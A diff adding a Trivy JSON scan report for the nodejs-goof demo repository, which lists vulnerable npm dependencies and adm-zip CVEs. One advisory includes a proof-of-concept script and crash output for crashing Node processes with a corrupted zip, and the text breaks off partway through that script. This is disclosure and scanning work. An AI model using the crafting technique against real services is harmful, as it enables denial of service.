@@ -1,0 +1,1293 @@
+{
+  "SchemaVersion": 2,
+  "Trivy": {
+    "Version": "0.76.2"
+  },
+  "ReportID": "01a1b594-e985-749f-8f6d-7e8dbc64266b",
+  "CreatedAt": "2026-11-07T10:36:37.637305974Z",
+  "ArtifactID": "sha256:0fb8453e87a5a424a4f1a34587244f916fd1e1ae83cce170ca8d07386b59a9aa",
+  "ArtifactName": "https://github.com/snyk-labs/nodejs-goof",
+  "ArtifactType": "repository",
+  "Metadata": {
+    "RepoURL": "https://github.com/snyk-labs/nodejs-goof",
+    "Branch": "main",
+    "Commit": "add14ba59e98240d9e00a235dd7d42cd61ae9912",
+    "CommitMsg": "feat: add support for redirecting admins to custom dashboards view (#1419)\n\nHi there!\r\n\r\nThis pull request adds an `onLoginSuccessHook` middleware function to the web app to support a feature in which users can be redirected to their custom dashboard views in the app (or other pages such as account / settings / etc).\r\n\r\nI also added a `console.log()` to audit logged-in state for tampering threat model.",
+    "Author": "Liran Tal <liran.tal@gmail.com>",
+    "Committer": "GitHub <noreply@github.com>"
+  },
+  "Results": [
+    {
+      "Target": "package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "adm-zip@0.4.7",
+          "Name": "adm-zip",
+          "Identifier": {
+            "PURL": "pkg:npm/adm-zip@0.4.7",
+            "UID": "52cd838e1c846549"
+          },
+          "Version": "0.4.7",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 334,
+              "EndLine": 341
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "body-parser@1.9.0",
+          "Name": "body-parser",
+          "Identifier": {
+            "PURL": "pkg:npm/body-parser@1.9.0",
+            "UID": "d8913798a3b8288a"
+          },
+          "Version": "1.9.0",
+          "Relationship": "direct",
+          "DependsOn": [
+            "bytes@1.0.0",
+            "depd@1.0.1",
+            "iconv-lite@0.4.4",
+            "media-typer@0.3.0",
+            "on-finished@2.1.0",
+            "qs@2.2.4",
+            "raw-body@1.3.0",
+            "type-is@1.5.7"
+          ],
+          "Locations": [
+            {
+              "StartLine": 664,
+              "EndLine": 681
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "cfenv@1.2.2",
+          "Name": "cfenv",
+          "Identifier": {
+            "PURL": "pkg:npm/cfenv@1.2.2",
+            "UID": "112f2ddd8597c665"
+          },
+          "Version": "1.2.2",
+          "Relationship": "direct",
+          "DependsOn": [
+            "js-yaml@3.13.1",
+            "ports@1.1.0",
+            "underscore@1.9.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1093,
+              "EndLine": 1102
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "consolidate@0.14.5",
+          "Name": "consolidate",
+          "Identifier": {
+            "PURL": "pkg:npm/consolidate@0.14.5",
+            "UID": "60cff098b1393100"
+          },
+          "Version": "0.14.5",
+          "Relationship": "direct",
+          "DependsOn": [
+            "bluebird@3.5.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1616,
+              "EndLine": 1623
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "dustjs-helpers@1.5.0",
+          "Name": "dustjs-helpers",
+          "Identifier": {
+            "PURL": "pkg:npm/dustjs-helpers@1.5.0",
+            "UID": "4927b69d979a743b"
+          },
+          "Version": "1.5.0",
+          "Relationship": "direct",
+          "DependsOn": [
+            "dustjs-linkedin@2.5.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2142,
+              "EndLine": 2149
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "dustjs-linkedin@2.5.0",
+          "Name": "dustjs-linkedin",
+          "Identifier": {
+            "PURL": "pkg:npm/dustjs-linkedin@2.5.0",
+            "UID": "86fb02258c7d65cc"
+          },
+          "Version": "2.5.0",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 2150,
+              "EndLine": 2157
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "ejs@1.0.0",
+          "Name": "ejs",
+          "Identifier": {
+            "PURL": "pkg:npm/ejs@1.0.0",
+            "UID": "f9ae822b23f55561"
+          },
+          "Version": "1.0.0",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 2172,
+              "EndLine": 2177
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "ejs-locals@1.0.2",
+          "Name": "ejs-locals",
+          "Identifier": {
+            "PURL": "pkg:npm/ejs-locals@1.0.2",
+            "UID": "f07755277d7b5c66"
+          },
+          "Version": "1.0.2",
+          "Relationship": "direct",
+          "DependsOn": [
+            "ejs@0.8.8"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2178,
+              "EndLine": 2188
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "errorhandler@1.2.0",
+          "Name": "errorhandler",
+          "Identifier": {
+            "PURL": "pkg:npm/errorhandler@1.2.0",
+            "UID": "c4cb878726de1a85"
+          },
+          "Version": "1.2.0",
+          "Relationship": "direct",
+          "DependsOn": [
+            "accepts@1.1.4",
+            "escape-html@1.0.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2233,
+              "EndLine": 2244
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "express@4.12.4",
+          "Name": "express",
+          "Identifier": {
+            "PURL": "pkg:npm/express@4.12.4",
+            "UID": "601ff7d0b7c97885"
+          },
+          "Version": "4.12.4",
+          "Relationship": "direct",
+          "DependsOn": [
+            "accepts@1.2.13",
+            "content-disposition@0.5.0",
+            "content-type@1.0.4",
+            "cookie-signature@1.0.6",
+            "cookie@0.1.2",
+            "debug@2.2.0",
+            "depd@1.0.1",
+            "escape-html@1.0.1",
+            "etag@1.6.0",
+            "finalhandler@0.3.6",
+            "fresh@0.2.4",
+            "merge-descriptors@1.0.0",
+            "methods@1.1.2",
+            "on-finished@2.2.1",
+            "parseurl@1.3.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2431,
+              "EndLine": 2464
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "express-fileupload@0.0.5",
+          "Name": "express-fileupload",
+          "Identifier": {
+            "PURL": "pkg:npm/express-fileupload@0.0.5",
+            "UID": "8ecdd63fa063384c"
+          },
+          "Version": "0.0.5",
+          "Relationship": "direct",
+          "DependsOn": [
+            "connect-busboy@0.0.2",
+            "fs-extra@0.22.1",
+            "streamifier@0.1.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2465,
+              "EndLine": 2478
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "express-session@1.17.2",
+          "Name": "express-session",
+          "Identifier": {
+            "PURL": "pkg:npm/express-session@1.17.2",
+            "UID": "956fe803f850fe2"
+          },
+          "Version": "1.17.2",
+          "Relationship": "direct",
+          "DependsOn": [
+            "cookie-signature@1.0.6",
+            "cookie@0.4.1",
+            "debug@2.6.9",
+            "depd@2.0.0",
+            "on-headers@1.0.2",
+            "parseurl@1.3.3",
+            "safe-buffer@5.2.1",
+            "uid-safe@2.1.5"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2479,
+              "EndLine": 2496
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "file-type@8.1.0",
+          "Name": "file-type",
+          "Identifier": {
+            "PURL": "pkg:npm/file-type@8.1.0",
+            "UID": "b77b29bad3b5185"
+          },
+          "Version": "8.1.0",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 2703,
+              "EndLine": 2710
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "hbs@4.0.4",
+          "Name": "hbs",
+          "Identifier": {
+            "PURL": "pkg:npm/hbs@4.0.4",
+            "UID": "3a40ea62ff1d399b"
+          },
+          "Version": "4.0.4",
+          "Relationship": "direct",
+          "DependsOn": [
+            "handlebars@4.0.14",
+            "walk@2.3.9"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3287,
+              "EndLine": 3298
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "humanize-ms@1.0.1",
+          "Name": "humanize-ms",
+          "Identifier": {
+            "PURL": "pkg:npm/humanize-ms@1.0.1",
+            "UID": "e18cfaeb7aa6df97"
+          },
+          "Version": "1.0.1",
+          "Relationship": "direct",
+          "DependsOn": [
+            "ms@0.6.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3456,
+              "EndLine": 3463
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2018-1002204",
+          "PkgID": "adm-zip@0.4.7",
+          "PkgName": "adm-zip",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/adm-zip@0.4.7",
+            "UID": "52cd838e1c846549"
+          },
+          "InstalledVersion": "0.4.7",
+          "FixedVersion": ">=0.4.9",
+          "Status": "fixed",
+          "SeveritySource": "nodejs-security-wg",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2018-1002204",
+          "DataSource": {
+            "ID": "nodejs-security-wg",
+            "Name": "Node.js Ecosystem Security Working Group",
+            "URL": "https://github.com/nodejs/security-wg"
+          },
+          "Fingerprint": "sha256:21f526a1b0eeb268e577133215152d1264f921d36c991296aea13248064448a4",
+          "Title": "nodejs-adm-zip: arbitrary file write vulnerability / arbitrary code execution using a specially crafted zip file",
+          "Description": "adm-zip npm library before 0.4.9 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nodejs-security-wg": 3,
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+              "V3Score": 5.5
+            },
+            "nvd": {
+              "V2Vector": "AV:N/AC:M/Au:N/C:N/I:P/A:N",
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+              "V2Score": 4.3,
+              "V3Score": 5.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L",
+              "V3Score": 5.3
+            }
+          },
+          "References": [
+            "http://www.securityfocus.com/bid/107001",
+            "https://access.redhat.com/security/cve/CVE-2018-1002204",
+            "https://github.com/advisories/GHSA-3v6h-hqm4-2rg6",
+            "https://github.com/cthackers/adm-zip/commit/62f64004fefb894c523a7143e8a88ebe6c84df25",
+            "https://github.com/cthackers/adm-zip/pull/212",
+            "https://github.com/snyk/zip-slip-vulnerability",
+            "https://hackerone.com/reports/362118",
+            "https://nvd.nist.gov/vuln/detail/CVE-2018-1002204",
+            "https://snyk.io/research/zip-slip-vulnerability",
+            "https://snyk.io/vuln/npm:adm-zip:20180415",
+            "https://www.cve.org/CVERecord?id=CVE-2018-1002204",
+            "https://www.npmjs.com/advisories/681",
+            "https://www.npmjs.com/advisories/994"
+          ],
+          "PublishedDate": "2018-07-25T17:29:01.657Z",
+          "LastModifiedDate": "2026-06-17T01:33:21.563Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-102282",
+          "VendorIDs": [
+            "GHSA-j5f4-cc29-5x44"
+          ],
+          "PkgID": "adm-zip@0.4.7",
+          "PkgName": "adm-zip",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/adm-zip@0.4.7",
+            "UID": "52cd838e1c846549"
+          },
+          "InstalledVersion": "0.4.7",
+          "FixedVersion": "0.6.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-102282",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:8487eee835dfa41cee1fce88656226bc0d39d677c62d39a8bb321b52dd645e79",
+          "Title": "adm-zip: adm-zip: Privilege escalation via unfiltered permission bits in extracted archives",
+          "Description": "adm-zip is a JavaScript library for creating and extracting ZIP archives in Node.js. Prior to 0.6.1, adm-zip applies the Unix permission bits stored in a zip entry directly to the extracted file via `fs.chmodSync()` when `keepOriginalPermission=true` is passed to `extractAllTo()`/`extractEntryTo()` — and it never filters the setuid/setgid/sticky bits out of those bits. A zip crafted by an attacker can therefore produce an extracted binary with mode `04755`. When extraction runs as root (the default posture in Docker builds, CI runners, and privileged install steps — the exact environments where this flag is used), the resulting root-owned setuid file is executed later by a lesser-privileged user, turning the attacker's code into a root execution. Version 0.6.1 fixes the issue.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-732"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-102282",
+            "https://advisory.echohq.com/cve/CVE-2026-102282",
+            "https://github.com/advisories/GHSA-j5f4-cc29-5x44",
+            "https://github.com/cthackers/adm-zip",
+            "https://github.com/cthackers/adm-zip/commit/6a63c339b83c52915483efacda517660a7a7bf87",
+            "https://github.com/cthackers/adm-zip/releases/tag/v0.6.1",
+            "https://github.com/cthackers/adm-zip/security/advisories/GHSA-j5f4-cc29-5x44",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-102282",
+            "https://www.cve.org/CVERecord?id=CVE-2026-102282"
+          ],
+          "PublishedDate": "2026-10-05T17:17:08.11Z",
+          "LastModifiedDate": "2026-10-07T21:17:07.297Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-39244",
+          "VendorIDs": [
+            "GHSA-xcpc-8h2w-3j85"
+          ],
+          "PkgID": "adm-zip@0.4.7",
+          "PkgName": "adm-zip",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/adm-zip@0.4.7",
+            "UID": "52cd838e1c846549"
+          },
+          "InstalledVersion": "0.4.7",
+          "FixedVersion": "0.6.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-39244",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:f5d00f5d7e3de5aa111359443588b75f7b4245dd8e97ac325aa1d6ba61d36c8b",
+          "Title": "adm-zip: adm-zip: Denial of Service via crafted ZIP file leading to excessive memory allocation",
+          "Description": "adm-zip before 0.5.18 is vulnerable to denial of service via a crafted ZIP file with a manipulated uncompressed size header field. In zipEntry.js line 103, Buffer.alloc(_centralHeader.size) allocates memory based on the declared uncompressed size from the ZIP central directory header without validating it against the actual compressed data size or imposing any upper bound. The size value is read directly from the binary header at entryHeader.js line 266 with no bounds check. An attacker can craft a ~120-byte ZIP file that declares ~4GB uncompressed size, causing a memory allocation amplification ratio of over 33 million to 1. The allocation occurs before CRC validation, so the malicious payload cannot be rejected early. All extraction and read methods are affected: readFile(), readAsText(), extractEntryTo(), extractAllTo(), extractAllToAsync(), test(), and entry.getData(). Any application accepting untrusted ZIP files via adm-zip is vulnerable to immediate process crash.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-39244",
+            "https://advisory.echohq.com/cve/CVE-2026-39244",
+            "https://github.com/advisories/GHSA-xcpc-8h2w-3j85",
+            "https://github.com/cthackers/adm-zip",
+            "https://github.com/cthackers/adm-zip/commit/2450dcf417aa29df49270237d18c5245794da3e2",
+            "https://github.com/cthackers/adm-zip/issues/568",
+            "https://github.com/cthackers/adm-zip/releases",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-39244",
+            "https://www.cve.org/CVERecord?id=CVE-2026-39244",
+            "https://www.npmjs.com/package/adm-zip"
+          ],
+          "PublishedDate": "2026-07-10T17:16:57.123Z",
+          "LastModifiedDate": "2026-07-10T19:17:23.25Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-77301",
+          "VendorIDs": [
+            "GHSA-7q85-xj36-vmfc"
+          ],
+          "PkgID": "adm-zip@0.4.7",
+          "PkgName": "adm-zip",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/adm-zip@0.4.7",
+            "UID": "52cd838e1c846549"
+          },
+          "InstalledVersion": "0.4.7",
+          "FixedVersion": "0.6.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-77301",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:1a5607d5e8d1e34e9542be7e6679af6a23c413c92314b4c53f73d19e68be0df9",
+          "Title": "adm-zip: adm-zip: Denial of Service via uncontrolled memory allocation",
+          "Description": "adm-zip is a JavaScript library for creating and extracting ZIP archives in Node.js. Prior to 0.6.1, getData() in zipEntry.js trusts an entry's central-directory uncompressed size and allocates output memory before validating that value against the actual compressed data and decompression result. A small crafted ZIP can declare a multi-gigabyte uncompressed size, causing Buffer.alloc and decompression handling to commit excessive resident memory before CRC validation reports an error. Applications that read entries from untrusted archives can therefore be terminated by the operating system or suffer service-wide memory exhaustion. This issue is fixed in version 0.6.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-77301",
+            "https://advisory.echohq.com/cve/CVE-2026-77301",
+            "https://github.com/advisories/GHSA-7q85-xj36-vmfc",
+            "https://github.com/cthackers/adm-zip",
+            "https://github.com/cthackers/adm-zip/commit/491600683dacb6cb9fe0718a0eeb9cb5eb49afa6",
+            "https://github.com/cthackers/adm-zip/releases/tag/v0.6.1",
+            "https://github.com/cthackers/adm-zip/security/advisories/GHSA-7q85-xj36-vmfc",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-77301",
+            "https://www.cve.org/CVERecord?id=CVE-2026-77301"
+          ],
+          "PublishedDate": "2026-09-18T17:17:00.507Z",
+          "LastModifiedDate": "2026-09-24T21:16:28.12Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-8238-w5pm-2374",
+          "PkgID": "adm-zip@0.4.7",
+          "PkgName": "adm-zip",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/adm-zip@0.4.7",
+            "UID": "52cd838e1c846549"
+          },
+          "InstalledVersion": "0.4.7",
+          "FixedVersion": "0.6.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-8238-w5pm-2374",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:ef093e59b7288347b4852b8544c3932f03125a6d857e133086bb941f0fea6523",
+          "Title": "adm-zip: Unhandled error event in async DEFLATE decompression crashes Node.js process (DoS)",
+          "Description": "## Summary\n\nDenial of Service in `adm-zip`'s async decompression API allows an unauthenticated attacker to crash the entire Node.js host process by supplying a single malformed ZIP file.\n\n## Details\n\n**Affected package**: adm-zip\n**Affected versions**: at least 0.6.0 (current latest); likely all versions containing the current `inflateAsync` implementation in `methods/inflater.js`\n**Patched version**: 0.6.1\n\n### Root Cause\n\n`methods/inflater.js:12-32` (`inflateAsync`) creates a `zlib.createInflateRaw(option)` stream and feeds it attacker-controlled compressed bytes via `tmp.end(inbuf)`, but never registers an `\"error\"` listener on the stream:\n\n```js\ninflateAsync: function (/*Function*/ callback) {\n    var tmp = zlib.createInflateRaw(option),\n        parts = [],\n        total = 0;\n    tmp.on(\"data\", function (data) { parts.push(data); total += data.length; });\n    tmp.on(\"end\", function () { /* build buf, callback(buf) */ });\n    tmp.end(inbuf);   // no tmp.on(\"error\", ...) registered anywhere\n}\n```\n\nPer Node.js `EventEmitter`/stream semantics, an `\"error\"` event emitted with zero listeners is rethrown as an **uncaught exception on a later tick**, originating from the zlib C++ binding. This cannot be caught by a `try/catch` wrapped around the calling code, because the throw happens asynchronously, outside the synchronous call stack the `try/catch` covers.\n\nThis code path is reached from every public async API that decompresses entry data: `readFileAsync`, `readAsTextAsync`, `extractAllToAsync`, and `ZipEntry.getDataAsync` (`zipEntry.js:51`, `:97-120`, `:309-315`; `adm-zip.js:157-164`, `:192-210`, `:893`).\n\nThis library recently patched **CVE-2026-39244** (GHSA-xcpc-8h2w-3j85), an unbounded `Buffer.alloc()` on the *synchronous* decompression path. That fix added a `maxOutputLength` option to `zlib.inflateRawSync`/`zlib.createInflateRaw`, and the sync path's resulting throw is naturally catchable. The async path shares the same `maxOutputLength` option (`methods/inflater.js:5`) but has no error-handling on the stream at all, so it was not covered by that fix and remains exploitable via either of two independent triggers:\n\n1. A DEFLATE entry with corrupted/malformed compressed bytes (`Z_DATA_ERROR`) — no special crafting needed.\n2. Compressed data whose inflated size exceeds the declared central-directory size, which now trips the `maxOutputLength` guard — but on the stream this surfaces via the unhandled `\"error\"` event rather than a catchable throw.\n\n### Attack Vector\n\n1. Attacker crafts (or corrupts) a ZIP file containing one DEFLATE-compressed entry with invalid/corrupted compressed bytes. Headers, CRC, and offsets can remain fully valid — only the compressed payload bytes need to be malformed.\n2. Victim application accepts this ZIP as an untrusted upload and processes it via any of adm-zip's async APIs, e.g.:\n   ```js\n   const zip = new AdmZip(uploadedBuffer);\n   zip.readFileAsync(zip.getEntries()[0], (data) => { /* ... */ });\n   ```\n3. `inflateAsync` begins decompressing; zlib emits `\"error\"` on `Z_DATA_ERROR`.\n4. No listener exists for that event, so Node rethrows it as an uncaught exception, crashing the entire host process — killing all in-flight requests for every other user/tenant on that process, not just the attacker's own request.\n\n## Impact\n\nAny Node.js service that accepts untrusted ZIP uploads and processes them via adm-zip's async API (the documented, recommended pattern for non-blocking servers) can be crashed by a single unauthenticated request containing one small malicious file. This is a full process-level denial of service, not a per-request error.\n\n## Proof of Concept\n\nAttached: `poc_async_dos.py`. Summary of what it does:\n\n1. Builds a fully valid ZIP using adm-zip's own writer (`new AdmZip(); zip.addFile(...); zip.toBuffer()`), guaranteeing correct headers/CRC/offsets.\n2. Locates the local file header's compressed-data region via its own (untouched) size/offset fields and XORs every byte in that region with `0xFF`, corrupting only the DEFLATE payload.\n3. Parses the corrupted archive with a fresh `new AdmZip(badBuf)` (succeeds — headers are intact) and calls `entries[0].getDataAsync(callback)`, wrapped in `try/catch`, in an isolated child process.\n4. Captures the child's exit code and stderr.\n\nVerified independently 3/3 runs (plus 2 isolating controls: an unmodified zip through the same path does not crash; bare Node `zlib.createInflateRaw()` fed garbage with no error listener reproduces the identical crash outside adm-zip entirely, confirming the root cause is the missing listener, not something else). Representative output:\n\n```\n[*] Child process exit code: 1\n----- Node child process stderr (crash evidence) -----\nnode:events:497\n      throw er; // Unhandled 'error' event\n      ^\nError: invalid distance too far back\n    at genericNodeError (node:internal/errors:983:15)\n    at Zlib.zlibOnError [as onerror] (node:zlib:191:17)\nEmitted 'error' event on InflateRaw instance at:\n    at emitErrorNT (node:internal/streams/destroy:170:8)\n    at emitErrorCloseNT (node:internal/streams/destroy:129:3)\n    at process.processTicksAndRejections (node:internal/process/task_queues:89:21) {\n  errno: -3,\n  code: 'Z_DATA_ERROR'\n}\nNode.js v22.22.1\n--------------------------------------\n[*] Caught by harness's own try/catch (would mean NOT vulnerable): False\n[*] getDataAsync callback ever fired (would mean NOT vulnerable): False\n[*] Child process exited non-zero (crashed): True\n[+] VULNERABILITY CONFIRMED\n```\n\nReproduction: `python3 poc_async_dos.py` (requires python3 and Node.js; tested on Node.js v22.22.1).\n\n## Suggested Fix\n\nRegister an `\"error\"` listener on the `InflateRaw` stream in `methods/inflater.js`'s `inflateAsync`, and route it to the existing `callback`, e.g.:\n\n```js\ninflateAsync: function (/*Function*/ callback) {\n    var tmp = zlib.createInflateRaw(option),\n        parts = [],\n        total = 0;\n    tmp.on(\"data\", function (data) { parts.push(data); total += data.length; });\n    tmp.on(\"error\", function (err) {\n        // surface as a normal async error instead of crashing the process\n        callback(Buffer.alloc(0), err);   // or however this codebase's async\n                                            // error convention is expressed\n    });\n    tmp.on(\"end\", function () { /* existing behavior */ });\n    tmp.end(inbuf);\n}\n```\n\nThe exact callback/error-propagation convention should match the rest of the codebase's async error handling style (a quick look suggests callbacks here are currently success-only; this may need a small signature adjustment or an `err`-first convention, at the maintainer's discretion). The key fix is simply: **never leave a Node.js stream without an `\"error\"` listener when it can plausibly error on attacker-controlled input.**\n\n## Full PoC Source (`poc_async_dos.py`)\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nTested version: adm-zip 0.6.0\nTested on: Linux, Node.js v22.22.1\n\nDescription:\n  methods/inflater.js:12-32 (inflateAsync) creates a\n  zlib.createInflateRaw(option) stream and calls tmp.end(inbuf) without ever\n  registering an \"error\" listener on the stream. Per Node.js EventEmitter\n  semantics, an \"error\" event emitted with zero listeners is rethrown as an\n  uncaught exception -- this happens on a later tick from the zlib C++\n  binding, so it CANNOT be caught by a try/catch wrapped around the calling\n  code. Any code that feeds an untrusted zip file into one of adm-zip's\n  public *Async APIs (readFileAsync, readAsTextAsync, extractAllToAsync,\n  ZipEntry.getDataAsync) crashes the entire host Node.js process the moment\n  it encounters a DEFLATE entry with corrupted/malformed compressed bytes.\n  The synchronous decompression path (getData()) was hardened for\n  CVE-2026-39244 (maxOutputLength + a throw that is naturally catchable);\n  this async streaming path was missed by that fix and remains an\n  unauthenticated, single-request availability bug.\n\nImpact:\n  Any service that accepts untrusted zip uploads and reads/extracts them\n  via adm-zip's async API (the officially documented, recommended usage\n  for non-blocking servers) can be crashed by a single malicious zip file,\n  with no authentication and no special privileges required.\n\nReproduction:\n  1. Install: this PoC runs directly against the adm-zip source tree this\n     script lives alongside (no `npm install` needed -- it requires the\n     local checkout via its package.json \"main\" entry, adm-zip.js).\n     Requires: python3, node (tested with Node.js v22.22.1).\n  2. Run: python3 poc_async_dos.py\n  3. Observe: the spawned Node child process exits non-zero with an\n     \"Unhandled 'error' event\" / Z_DATA_ERROR stack trace on stderr,\n     originating from methods/inflater.js's zlib.createInflateRaw stream.\n     Neither the harness's try/catch nor the getDataAsync callback ever\n     fires -- proving the crash is unrecoverable from calling code.\n\nHow the malicious zip is built (see the embedded Node harness in\nbuild_harness_script() below):\n  1. Use adm-zip's own writer (`new AdmZip(); zip.addFile(...); zip.toBuffer()`)\n     to produce a fully valid, well-formed zip archive with one DEFLATE\n     entry. This guarantees every header/CRC/offset field is structurally\n     correct.\n  2. Locate the local file header at offset 0 and compute the compressed\n     data region from the (untouched) LOCSIZ/LOCNAM/LOCEXT fields.\n  3. XOR every byte in that region with 0xFF, corrupting ONLY the DEFLATE\n     payload while leaving every size/offset/CRC field in the local header,\n     central directory, and EOCD record byte-for-byte unchanged, so\n     adm-zip's own parser still locates and slices exactly the right\n     region and reaches the vulnerable inflateAsync() call.\n\"\"\"\n\nimport os\nimport subprocess\nimport sys\nimport tempfile\n\n# ============================================================\n# Configuration\n# ============================================================\nPACKAGE_NAME = \"adm-zip\"\nTARGET_VERSION = \"0.6.0\"\n# The adm-zip source tree this PoC lives alongside (Hunter's checkout).\nREPO_DIR = os.path.dirname(os.path.abspath(__file__))\nNODE_BIN = \"node\"\nSUBPROCESS_TIMEOUT_SECONDS = 20\n\n\n# ============================================================\n# Node.js harness (the genuine trigger -- adm-zip is a JS library, so the\n# actual exploit code must run under Node; this Python script builds it,\n# runs it in an isolated child process, and interprets the result).\n# ============================================================\ndef build_harness_script(repo_dir: str) -> str:\n    return r\"\"\"\n\"use strict\";\nconst AdmZip = require(%(repo_dir)r);\n\nconsole.log(\"HARNESS_START\");\n\n// Step 1: build a legitimate zip in memory using adm-zip's OWN writer, with\n// one DEFLATE-compressed entry. Repetitive text compresses well and\n// guarantees the DEFLATED method is chosen (not STORED).\nconst zip = new AdmZip();\nconst payload = Buffer.from(\n    \"The quick brown fox jumps over the lazy dog. \".repeat(200),\n    \"utf8\"\n);\nzip.addFile(\"payload.txt\", payload, \"\");\nconst goodBuf = 